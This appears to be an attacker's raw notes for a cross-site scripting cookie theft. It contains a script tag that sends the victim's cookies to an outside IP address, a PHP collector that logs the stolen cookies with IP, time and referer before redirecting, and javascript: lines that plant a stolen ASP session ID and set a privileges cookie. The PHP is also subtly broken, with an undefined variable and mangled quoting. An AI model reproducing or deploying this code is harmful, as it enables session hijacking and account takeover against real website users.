<script>document.location="http://11.11.199.111/cookie.php?c="+document.cookie</script> 

<?php
$_COOKIE=$_GET['c'];
$cookies=explode(";",$_COOKIE);
$ip=getenv('REMOTE_ADDR');
$date=date("j F, Y, g:ia");;
$referer=getenv('HTTP_REFERER');
$fp=fopen('cookies.html','a');
fwrite($fp,'Cookie:'.$cookie.'<br>IP:'.$ip.'<br>Date and Time:'.$date.'<br>Referer:'.$referer.'<br>
		<b>Copy:</b><br>javascript:document.cookie=\".$cookies[0].'\';
		javascript:document.cookie=\".$cookies[1].'\'<br><br><br>'."\n\n");fclose($fp);header("Location:
				http://11.11.199.101/homepage.asp");
?>
<HTML></HTML>


http://11.11.199.111/cookies.html

javascript:docment.cookie='ASPSESSIONIDAASSRADD=CIBDKJKBHMFLNGBDKIDKDFHK'

javascript:document.cookie='privileges=None'
